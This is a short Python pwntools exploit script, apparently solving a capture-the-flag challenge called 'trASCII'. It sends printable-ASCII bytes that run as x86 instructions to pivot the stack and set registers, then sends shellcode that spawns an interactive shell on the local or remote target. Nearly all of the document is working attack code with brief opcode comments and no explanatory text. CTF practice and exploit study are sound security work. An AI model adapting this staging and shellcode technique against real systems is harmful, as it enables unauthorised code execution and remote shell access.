from pwn import *

e = ELF("./trASCII")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("ctf.umbccd.io", 4800)
else:
  p = process(e.path)

p.sendlineafter("?", "ab" * 0x10 + "cd" * 3 + "d" * 9 + "S" + "P"
  + "bc" * (0x30 - 1) + "b" * 10
  + "h" * 8 + "UP" + "P" * 6 # push 0x50315431
  + "\\" * 7 # pop esp
  + "h" + "1" * 11 # push smth
  + "X" * 6 # pop eax
  + "5" + "1" * 11 
  + "H" * 6 # dec eax
  + "5" * 12 + "1" * 2
  + ("H" * 6 + "I" * 6) * (0xce - 0x80)# dec eax, ecx
  + "P" * 6 # push eax 
  + "G" * 6
  + "P" * 6 # push eax
  + "h" + "1" * 11 # push smth
  + "X" * 6 # pop eax
  + "5" + "1" * 11
  
  + "P" * 6 # push eax (0)
  + "U" * 6 # pop ebx
  + ("@" * 6 + "A" * 6) * 3 # inc eax 
  + "P" * 6 # push eax (3)

  + "h" + "T" + "P" * 6 # push buffer
  + "Y" * 6 # pop ecx

  + "[" * 6 
  + "Z" * 6 
  + "[" * 6 


  + ("G" * 6 + "O" * 6) * 0x11

  + "q" * 8
)

ui.pause()

p.sendline("A" * (0x50315535  -  0x50315431) + asm(shellcraft.sh()))



p.interactive()
